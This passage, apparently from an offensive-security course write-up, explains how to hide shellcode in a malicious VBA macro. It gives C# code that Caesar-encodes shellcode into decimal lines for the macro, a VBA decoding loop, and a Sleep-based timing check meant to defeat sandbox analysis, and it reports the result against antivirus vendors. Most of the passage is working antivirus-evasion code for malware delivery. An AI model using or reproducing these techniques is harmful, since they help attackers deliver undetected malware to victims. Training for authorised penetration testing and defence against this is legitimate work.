## We do this again
We'll reuse the previous C# project to encrypt the shellcode and then copy the encrypted result into the VBA macro.
For a VBA format, we'll use decimal values instead of hexadecimal.
We'll also split the encrypted shellcode on multiple lines in order to handle the maximum size issues of literal strings.
The edited code from previous ceaser cypher encoder will look as follows:
```C#
   byte[] encoded = new byte[buf.Length];
   for(int i = 0; i < buf.Length; i++)
   {
     encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
   }
 
  uint counter = 0;
 
   StringBuilder hex = new StringBuilder(encoded.Length * 2);
  foreach(byte b in encoded)
  {
    hex.AppendFormat("{0:D}, ", b);
    counter++;
    if(counter % 50 == 0)
    {
        hex.AppendFormat("_{0}", Environment.NewLine);
    }
  }
  Console.WriteLine("The payload is: " + hex.ToString());
```

The decryption key in the VBA itself is rather easy:
```VBA
For i = 0 To UBound(buf)
    buf(i) = buf(i) - 2
Next i
```

We also add a time lapse for behavioral detection:
```VBA
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Dim t1 As Date
Dim t2 As Date
Dim time As Long

t1 = Now()
Sleep (2000)
t2 = Now()
time = DateDiff("s", t1, t2)

If time < 2 Then
    Exit Function
End If
```

Even though we have encrypted our shellcode, and even made use of a time lapse function, our detection stays unchanged at 7/26 anti-virus vendors.
